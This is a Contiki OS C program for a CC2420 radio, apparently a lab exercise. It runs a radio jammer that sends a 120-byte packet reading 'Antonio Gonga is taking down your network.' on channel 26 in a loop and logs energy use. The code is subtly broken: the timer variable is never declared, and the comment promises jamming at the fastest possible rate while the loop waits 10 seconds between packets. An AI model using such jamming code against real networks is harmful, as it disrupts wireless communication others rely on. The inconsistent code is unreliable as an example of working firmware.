#include "contiki.h"
#include "random.h"
#include "net/netstack.h"
#include "sys/rtimer.h"
#include "dev/button-sensor.h"
#include "sys/energest.h"
#include "dev/leds.h"
#include "./cc2420.h"
#include <stdio.h>
#include <string.h>

// #define ONE_MS RTIMER_SECOND/1024
// #define TS_LEN  6*ONE_MS

#define JAMMER_PACKET_LEN 120
#define ENERGEST_CONF_ON 1

//struct to describe data packet 
typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;


//function to convert time to seconds 
static unsigned long to_seconds(uint64_t time) {
  return (unsigned long)(time / ENERGEST_SECOND);
}
/*---------------------------------------------------------------------------*/

PROCESS(jammerProcess, "Jammer Process");
AUTOSTART_PROCESSES(&jammerProcess);

/*---------------------------------------------------------------------------*/
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(jammerProcess, ev, data)
{
  
  PROCESS_BEGIN();
  //TODO: Use energest to look at energy efficiency
  //TODO: Use timers to handle loop
  //Work only with radio activation time

  etimer_set(&periodic_timer, CLOCK_SECOND * 10);   //set timer 
  cc2420_set_channel(26);                           //set channel

  //Load data into packet
  jpacket_t jpacket;                                                      
  memset(&jpacket, 0, sizeof(jpacket_t));                                  
  strcpy(jpacket.data, "Antonio Gonga is taking down your network.");     
    

  //Constant jammer - jams with fastest interval possible  
  while(1) {
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
     
     //resets timer 
     etimer_reset(&periodic_timer);

     //CALL Radio Driver to transmit the Packet..
     cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN); 
     
     /* Update all energest times. */
     energest_flush();

     printf("\nEnergest:\n");
     printf(" CPU          %4lus LPM      %4lus DEEP LPM %4lus  Total time %lus\n",
           to_seconds(energest_type_time(ENERGEST_TYPE_CPU)),
           to_seconds(energest_type_time(ENERGEST_TYPE_LPM)),
           to_seconds(energest_type_time(ENERGEST_TYPE_DEEP_LPM)),
           to_seconds(ENERGEST_GET_TOTAL_TIME()));
     printf(" Radio LISTEN %4lus TRANSMIT %4lus OFF      %4lus\n",
           to_seconds(energest_type_time(ENERGEST_TYPE_LISTEN)),
           to_seconds(energest_type_time(ENERGEST_TYPE_TRANSMIT)),
           to_seconds(ENERGEST_GET_TOTAL_TIME()
                      - energest_type_time(ENERGEST_TYPE_TRANSMIT)
                      - energest_type_time(ENERGEST_TYPE_LISTEN)));
  }
  PROCESS_END();
}

